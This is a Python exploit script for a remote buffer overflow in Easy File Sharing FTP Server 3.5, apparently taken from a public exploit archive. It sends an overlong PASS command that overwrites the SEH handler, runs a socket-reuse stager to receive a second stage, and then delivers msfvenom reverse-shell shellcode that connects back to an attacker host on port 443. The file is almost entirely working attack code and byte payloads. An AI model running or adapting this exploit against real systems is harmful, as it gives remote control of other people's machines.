#!/usr/bin/env python
# Author: Xavi Beltran
# Date: 16/08/2019
# Description:
#           Easy File Sharing FTP Server 3.5
#           Remote Buffer Overflow
#	    Socket recv technique

# Contact: xavibeltran@protonmail.com
# Webpage: https://xavibel.com
# Tested on: Windows 7
import socket
import sys
from time import sleep
host = "192.168.1.99"
port = 21

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "[+]connecting to host..."
	con.connect((host,port))
	print con.recv(1024)
except:
	print "could not connect to the host"

user = "USER anonymous"+"\r\n"
con.send(user)
print con.recv(1024)

#pop pop ret 10017F21 SSLEAY32.dll
seh = "\x21\x7F\x01\x10"

#forward jump + 22 bytes
nseh = "\xEB\x14\x90\x90"

socket_reuse = ""
socket_reuse += "\x54"                  # PUSH ESP
socket_reuse += "\x59"                  # POP ECX
socket_reuse += "\x66\x81\xC1\xA0\x5E"  # ADD CX, 5EA0
socket_reuse += "\x33\xD2"              # XOR EDX,EDX
socket_reuse += "\x52"                  # PUSH EDX
socket_reuse += "\x80\xC6\x02"           # ADD DH,2
socket_reuse += "\x52"                   # PUSH EDX
socket_reuse += "\x54"                   # PUSH ESP
socket_reuse += "\x5A"                   # POP EDX
socket_reuse += "\x66\x81\xC2\xBE\x10"   # ADD EDX, 10BE
socket_reuse += "\x52"                   # PUSH EDX
socket_reuse += "\xFF\x31"               # PUSH DWORD PTR DS:[ECX]

# 00456274   $-FF25 80E74700  JMP DWORD PTR DS:[<&WSOCK32.#16>]        ;  WSOCK32.recv
socket_reuse += "\xB8\x88\x74\x62\x45" # MOV EAX, 88456274 
socket_reuse += "\xC1\xE8\x08" # SHR EAX, 8  
socket_reuse += "\xFF\xD0" # CALL EAX


# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.88 EXITFUNC=thread -b "\x00" -f python -v shellcode
# Payload size: 351 bytes
shellcode =  ""
shellcode += "\xb8\xcd\x9a\xf3\x0b\xda\xcc\xd9\x74\x24\xf4\x5a"
shellcode += "\x31\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x0f"
shellcode += "\x9e\x11\xfe\x73\x77\x57\x01\x8b\x88\x38\x8b\x6e"
shellcode += "\xb9\x78\xef\xfb\xea\x48\x7b\xa9\x06\x22\x29\x59"
shellcode += "\x9c\x46\xe6\x6e\x15\xec\xd0\x41\xa6\x5d\x20\xc0"
shellcode += "\x24\x9c\x75\x22\x14\x6f\x88\x23\x51\x92\x61\x71"
shellcode += "\x0a\xd8\xd4\x65\x3f\x94\xe4\x0e\x73\x38\x6d\xf3"
shellcode += "\xc4\x3b\x5c\xa2\x5f\x62\x7e\x45\xb3\x1e\x37\x5d"
shellcode += "\xd0\x1b\x81\xd6\x22\xd7\x10\x3e\x7b\x18\xbe\x7f"
shellcode += "\xb3\xeb\xbe\xb8\x74\x14\xb5\xb0\x86\xa9\xce\x07"
shellcode += "\xf4\x75\x5a\x93\x5e\xfd\xfc\x7f\x5e\xd2\x9b\xf4"
shellcode += "\x6c\x9f\xe8\x52\x71\x1e\x3c\xe9\x8d\xab\xc3\x3d"
shellcode += "\x04\xef\xe7\x99\x4c\xab\x86\xb8\x28\x1a\xb6\xda"
shellcode += "\x92\xc3\x12\x91\x3f\x17\x2f\xf8\x57\xd4\x02\x02"
shellcode += "\xa8\x72\x14\x71\x9a\xdd\x8e\x1d\x96\x96\x08\xda"
shellcode += "\xd9\x8c\xed\x74\x24\x2f\x0e\x5d\xe3\x7b\x5e\xf5"
shellcode += "\xc2\x03\x35\x05\xea\xd1\x9a\x55\x44\x8a\x5a\x05"
shellcode += "\x24\x7a\x33\x4f\xab\xa5\x23\x70\x61\xce\xce\x8b"
shellcode += "\xe2\x31\xa6\x92\xaa\xd9\xb5\x94\x4b\xa1\x33\x72"
shellcode += "\x21\xc5\x15\x2d\xde\x7c\x3c\xa5\x7f\x80\xea\xc0"
shellcode += "\x40\x0a\x19\x35\x0e\xfb\x54\x25\xe7\x0b\x23\x17"
shellcode += "\xae\x14\x99\x3f\x2c\x86\x46\xbf\x3b\xbb\xd0\xe8"
shellcode += "\x6c\x0d\x29\x7c\x81\x34\x83\x62\x58\xa0\xec\x26"
shellcode += "\x87\x11\xf2\xa7\x4a\x2d\xd0\xb7\x92\xae\x5c\xe3"
shellcode += "\x4a\xf9\x0a\x5d\x2d\x53\xfd\x37\xe7\x08\x57\xdf"
shellcode += "\x7e\x63\x68\x99\x7e\xae\x1e\x45\xce\x07\x67\x7a"
shellcode += "\xff\xcf\x6f\x03\x1d\x70\x8f\xde\xa5\x90\x72\xca"
shellcode += "\xd3\x38\x2b\x9f\x59\x25\xcc\x4a\x9d\x50\x4f\x7e"
shellcode += "\x5e\xa7\x4f\x0b\x5b\xe3\xd7\xe0\x11\x7c\xb2\x06"
shellcode += "\x85\x7d\x97"


crash ="PASS " + "\x2c" + "A"*2559 + nseh + seh + "\x90"*22  + socket_reuse + "\x90"*40 +"\r\n"


print "[+] Stage 1...\n"
con.send(crash)
print "[+] Stage 2...\n"

#raw_input("Press Enter to continue...")
sleep(1)


con.send("\x90" * 30 + shellcode + "\xCC" * 20)
print con.recv(1024)
con.close()
